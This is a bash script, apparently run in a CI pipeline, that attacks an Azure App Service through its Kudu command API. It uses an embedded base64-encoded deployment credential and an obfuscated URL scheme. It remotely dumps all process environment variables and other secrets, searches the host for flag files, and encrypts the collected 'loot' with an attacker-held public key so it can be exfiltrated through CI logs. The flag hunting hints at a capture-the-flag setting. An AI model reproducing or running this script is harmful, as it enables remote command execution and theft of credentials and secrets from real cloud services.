#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"
SCMH="app-tbl-reporting-prod.scm.azurewebsites.net"
CRED=$(printf '%s' "JGFwcC10YmwtcmVwb3J0aW5nLXByb2Q6WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB" | base64 -d)
echo "=== RUNNER SHELL PROOF $(date -u) ==="
id; whoami; hostname; uname -a; echo "cwd=$(pwd)"
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
kudu(){ # $1 = shell command
  curl -sS -u "$CRED" -H 'Content-Type: application/json' -H 'If-Match: *' \
    -X POST "https://$SCMH/api/command" \
    --data "$(python3 -c 'import json,sys;print(json.dumps({"command":sys.argv[1],"dir":"/home/site/wwwroot"}))' "$1")" | head -c 6000
}
say "=== app process env (filtered) ==="
say "$(kudu "for p in /proc/[0-9]*; do tr '\0' '\n' < \$p/environ 2>/dev/null; done | sort -u | grep -iE 'config|storage|flag|secret|token|key|connection|account'")"
say "=== full app env ==="
say "$(kudu "for p in /proc/[0-9]*; do tr '\0' '\n' < \$p/environ 2>/dev/null; done | sort -u")"
say "=== find flag files ==="
say "$(kudu "find / -xdev -iname '*flag*' 2>/dev/null | head -40")"
say "=== grep flag content ==="
say "$(kudu "grep -rIil 'flag' /home /tmp /opt 2>/dev/null | head -40")"
say "=== grep flag pattern ==="
say "$(kudu "grep -rIoh -E '.{0,30}(flag|FLAG|TBL|CTF)\{[^}]{2,100}\}' /home /tmp /opt /etc 2>/dev/null | head -20")"
say "=== wwwroot ==="
say "$(kudu "ls -la /home/site/wwwroot; cat /home/site/wwwroot/startup.sh 2>/dev/null")"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
